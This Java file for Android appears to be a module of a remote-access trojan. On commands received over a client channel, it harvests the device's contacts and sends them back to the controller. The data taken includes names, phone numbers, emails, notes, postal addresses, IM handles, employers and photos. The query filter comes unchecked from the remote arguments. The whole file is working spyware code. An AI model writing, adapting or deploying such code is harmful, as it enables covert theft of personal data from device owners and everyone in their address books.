package my.app.Library;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Bitmap.CompressFormat;
import android.net.Uri;
import android.provider.ContactsContract;

import utils.Contact;

import my.app.client.ClientListener;
import Packet.ContactsPacket;

public class ContactsLister {

	
	public static boolean listContacts(ClientListener c, int channel, byte[] args) {
		ArrayList<Contact> l = new ArrayList<Contact>();

		boolean ret = false;
		String WHERE_CONDITION = new String(args);

        ContentResolver cr = c.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,WHERE_CONDITION, null, " DISPLAY_NAME ");

        if (cur.getCount() > 0) {
           while (cur.moveToNext()) {
        	   Contact con = new Contact();
        	   
               String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
               long idlong = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts._ID));
               
               int times_contacted = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
               long last_time_contacted = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
               String disp_name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
               int starred = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.STARRED));
               
               con.setId(idlong);
               con.setLast_time_contacted(last_time_contacted);
               con.setTimes_contacted(times_contacted);
               con.setDisplay_name(disp_name);
               con.setStarred(starred);
              
               
               String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
               if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

                   // get the phone number
                   Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                                          ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", new String[]{id}, null);
                   ArrayList<String> phones = new ArrayList<String>();
                   while (pCur.moveToNext()) {
                         String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                         phones.add(phone);
                   }
                   pCur.close();
                   con.setPhones(phones);
                   
                  // get email and type
                  Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                           											null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                           											new String[]{id}, null);
                  if(emailCur.getCount() != 0) {
                	  ArrayList<String> emails = new ArrayList<String>();
	                   while (emailCur.moveToNext()) {
	                       // This would allow you get several email addresses if the email addresses were stored in an array
	                       String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
	                       //String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
	                       emails.add(email);
	                   }
	                   emailCur.close();
	                   con.setEmails(emails);
                  }
                  
                   // Get note.......
                   String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] noteWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
                   Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
                   if(noteCur.getCount() != 0) {
                	   ArrayList<String> notes = new ArrayList<String>();
	                   if (noteCur.moveToFirst()) {
	                       String note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
	                       notes.add(note);
	                   }
	                   noteCur.close();
	                   con.setNotes(notes);
                   }

                   
                   //Get Postal Address....
                   String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] addrWhereParams = new String[]{id, ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                   Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);
                   
                   if(addrCur.getCount() != 0) {
	                   while(addrCur.moveToNext()) {
	                       String street = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
	                       String city = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
	                       String state = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
	                       String postalCode = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
	                       String country = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
	                       int type = addrCur.getInt(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
	
	                       con.setStreet(street);
	                       con.setCity(city);
	                       con.setRegion(state);
	                       con.setPostalcode(postalCode);
	                       con.setCountry(country);
	                       con.setType_addr(type);
	                   }
	                   addrCur.close();
                   }
                   
                   // Get Instant Messenger.........
                   String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] imWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                   Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
                   if(imCur.getCount() != 0) {
                	   ArrayList<String> ims= new ArrayList<String>();
	                   if (imCur.moveToFirst()) {
	                       String imName = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
	                       //String imType = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
	                       ims.add(imName);
	                   }
	                   imCur.close();
	                   con.setMessaging(ims);
                   }
                   
                   // Get Organizations.........
                   String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] orgWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                   Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
                   if(orgCur.getCount() != 0) {
	                   if (orgCur.moveToFirst()) {
	                       String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
	                       String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
	                       
	                       con.setOrganisationName(orgName);
	                       con.setOrganisationStatus(title);
	                   }
	                   orgCur.close();
                   }
                   
                   //Picture Image
           	    	Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, idlong);
	        	    InputStream input = ContactsContract.Contacts.openContactPhotoInputStream(cr, uri);
	        	    if (input != null) {
	        	        Bitmap pic = BitmapFactory.decodeStream(input);
	        	              	        
	        	        ByteArrayOutputStream bos = new ByteArrayOutputStream();
	        	        pic.compress(CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
	        	        byte[] bitmapdata = bos.toByteArray();
	        	        con.setPhoto(bitmapdata);
	        	        //Bitmap bitmap = BitmapFactory.decodeByteArray(bitmapdata , 0, bitmapdata .length);
	        	    }
	        	    l.add(con);
               }
               
           }
           ret = true;
      }
      else
    	  ret = false;
		
		
      c.handleData(channel, new ContactsPacket(l).build());
      return ret;
	}
}
